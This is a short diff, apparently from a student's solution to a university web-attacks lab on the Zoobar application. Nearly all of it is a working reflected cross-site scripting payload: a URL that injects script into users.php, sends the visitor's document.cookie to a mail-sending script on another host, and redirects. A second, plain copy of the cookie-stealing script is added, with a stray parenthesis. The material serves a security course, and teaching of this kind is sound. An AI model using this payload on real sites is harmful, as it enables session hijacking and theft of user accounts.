@@ -1,1 +1,7 @@
-http://dasak.csc.kth.se/zoobar/users.php?user="%3E%3Cscript%3E%28new%20Image%28%29%29.src='http://www.csc.kth.se/utbildning/kth/kurser/DD2395/dasak13/Labs/WebAttacks/sendmail.php?%27%2B%20'to=felixds@kth.se'%20%2B%20'%26payload='%20%2B%20document.cookie%20%2B%20'%26random='%20%2B%20Math.random%28%29;window.location="users.php";%3C/script%3E
+http://dasak.csc.kth.se/zoobar/users.php?user="%3E%3Cscript%3E%28new%20Image%28%29%29.src='http://www.csc.kth.se/utbildning/kth/kurser/DD2395/dasak13/Labs/WebAttacks/sendmail.php?%27%2B%20'to=felixds@kth.se'%20%2B%20'%26payload='%20%2B%20document.cookie%20%2B%20'%26random='%20%2B%20Math.random%28%29;window.location.replace("http://dasak.csc.kth.se/zoobar/users.php");%3C/script%3E
+
+
+<script>
+(new Image()).src='http://www.csc.kth.se/utbildning/kth/kurser/DD2395/dasak13/Labs/WebAttacks/sendmail.php?' + 
+'to=felixds@kth.se' + '&payload=' + document.cookie + '&random=' + Math.random());
+</script>	
